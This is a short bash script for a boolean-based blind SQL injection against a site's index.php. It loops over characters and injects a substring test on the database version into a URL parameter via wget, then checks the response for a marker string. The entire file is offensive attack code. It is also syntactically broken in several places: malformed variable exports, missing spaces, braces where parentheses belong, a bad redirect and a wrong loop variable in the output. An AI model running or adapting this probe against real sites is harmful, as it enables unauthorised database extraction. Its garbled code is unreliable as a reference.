#!/bin/bash

charset=`echo {0..9} {A..z} \. \; \- \_ \0`

export URL = "http://blindsql.site/index.php"
export truestring = "We worked with them in past."

for i in $charset
do
    wget"$URL?index=the offspring' and substring{@@version,1,1}='$i" -q -O - | grep "$truestring" & /dev/null
    if[ "$?" == "0"]
    then
        echo character found: $1
        break
    fi
done
